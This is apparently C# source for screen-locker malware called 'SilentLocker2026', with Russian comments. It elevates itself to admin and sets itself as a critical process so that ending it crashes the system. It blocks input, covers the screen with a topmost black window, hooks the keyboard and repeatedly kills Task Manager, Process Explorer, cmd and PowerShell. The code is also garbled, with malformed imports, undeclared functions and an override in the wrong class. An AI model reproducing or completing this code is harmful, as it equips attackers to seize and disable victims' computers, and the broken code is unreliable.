using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace SilentLocker2026
{
    class Program
    {
        // --- Импорты --- private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId); private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("advapi32.dll", SetLastError = true) DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool BlockInput(bool fBlockIt); private static extern bool LockWorkStation(); private static extern int NtSetInformationProcess(
            IntPtr hProcess, int ProcessInformationClass, ref int ProcessInformation, int ProcessInformationLength);

        private const int WH_KEYBOARD_LL = 13;
        private const int ProcessBreakOnTermination = 0x1D;
        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static readonly string UNIQUE_ID = Guid.NewGuid().ToString().Substring(0, 8).ToUpper();
        private static IntPtr hHook = IntPtr.Zero;
        private static bool shiftDown = false;
        private static bool ctrlDown = false;
        private static bool altDown = false;
        private static bool rPressed = false;
        private static bool promptVisible = false;

        private static KBHOOKSTRUCT kbStruct = new KBHOOKSTRUCT();

        [StructLayout(LayoutKind.Sequential)]
        private struct KBHOOKSTRUCT
        {
            public int vkCode;
            public int scanCode;
            public int flags;
            public int time;
            public IntPtr dwExtraInfo;
        }

        static void Main()
        {
            if (!IsUserAnAdmin())
            {
                // Запуск от админа
                var proc = new System.Diagnostics.Process
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        FileName = Environment.CommandLine,
                        UseShellExecute = true,
                        Verb = "runas",
                        CreateNoWindow = true
                    }
                };
                try { proc.Start(); } catch { }
                return;
            }

            // Критический процесс
            try
            {
                int flag = 1;
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, ProcessBreakOnTermination, ref flag, 4);
            }
            catch { }

            // Блокировка
            BlockInput(true);
            LockWorkStation();

            // Запуск хука
            StartHook();

            // Показ экрана
            Application.Run(new Form
            {
                FormBorderStyle = FormBorderStyle.None,
                WindowState = FormWindowState.Maximized,
                TopMost = true,
                BackColor = Color.Black,
                StartPosition = FormStartPosition.CenterScreen,
                Cursor = Cursors.No,
                ControlBox = false
            });
        }

        private static void StartHook()
        {
            HookProc proc = KeyLogger;
            hHook = SetWindowsHookEx(WH_KEYBOARD_LL, proc, IntPtr.Zero, 0);
        }

        private static IntPtr KeyLogger(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)0x0100) // Key down
            {
                kbStruct = (KBHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBHOOKSTRUCT));

                var key = (Keys)kbStruct.vkCode;

                // Ctrl + Alt + Shift + R
                if (key == Keys.ControlKey) ctrlDown = true;
                if (key == Keys.Menu) altDown = true;
                if (key == Keys.LShiftKey || key == Keys.RShiftKey) shiftDown = true;
                if (key == Keys.R && ctrlDown && altDown && shiftDown && !rPressed)
                {
                    rPressed = true;
                    BeginInvokeUnlock();
                }

                if (key == Keys.ControlKey && !((IntPtr)kbStruct.vkCode == (IntPtr)Keys.ControlKey && ctrlDown))
                    ctrlDown = false;
                if (key == Keys.Menu && !((IntPtr)kbStruct.vkCode == (IntPtr)Keys.Menu && altDown))
                    altDown = false;
                if ((key == Keys.LShiftKey || key == Keys.RShiftKey) &&
                    !((IntPtr)kbStruct.vkCode == (IntPtr)Keys.LShiftKey && shiftDown) &&
                    !((IntPtr)kbStruct.vkCode == (IntPtr)Keys.RShiftKey && shiftDown))
                    shiftDown = false;
                if (key == Keys.R && rPressed) rPressed = false;
            }
            return CallNextHookEx(hHook, nCode, wParam, lParam);
        }

        private static void BeginInvokeUnlock()
        {
            if (promptVisible) return;

            promptVisible = true;

            var prompt = new Form
            {
                FormBorderStyle = FormBorderStyle.None,
                StartPosition = FormStartPosition.CenterScreen,
                Size = new Size(300, 100),
                BackColor = Color.Black,
                ForeColor = Color.Lime,
                TopMost = true
            };

            var label = new Label
            {
                Text = $"Введите ID: {UNIQUE_ID}",
                Dock = DockStyle.Top,
                TextAlign = ContentAlignment.MiddleCenter,
                ForeColor = Color.White
            };

            var textBox = new TextBox
            {
                Dock = DockStyle.Bottom,
                ForeColor = Color.White,
                BackColor = Color.Gray,
                BorderStyle = BorderStyle.None,
                TextAlign = HorizontalAlignment.Center
            };

            var btn = new Button
            {
                Text = "OK",
                Dock = DockStyle.Fill,
                ForeColor = Color.White,
                BackColor = Color.DarkRed,
                FlatStyle = FlatStyle.Flat
            };

            btn.Click += (s, e) =>
            {
                if (textBox.Text.Trim().ToUpper() == UNIQUE_ID)
                {
                    UnhookWindowsHookEx(hHook);
                    Application.Exit();
                }
                else
                {
                    prompt.Close();
                    promptVisible = false;
                }
            };

            prompt.Controls.Add(label);
            prompt.Controls.Add(textBox);
            prompt.Controls.Add(btn);

            prompt.ShowDialog();
            promptVisible = false;
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            UnhookWindowsHookEx(hHook);
            BlockInput(false);
            base.OnFormClosed(e);
        }

        static void KillManager()
        {
            while (true)
            {
                foreach (var p in new[] { "taskmgr", "procexp", "cmd", "powershell" })
                {
                    foreach (var pr in Process.GetProcessesByName(p))
                    {
                        try { pr.Kill(); } catch { }
                    }
                }
                Thread.Sleep(800);
            }
        }
    }
}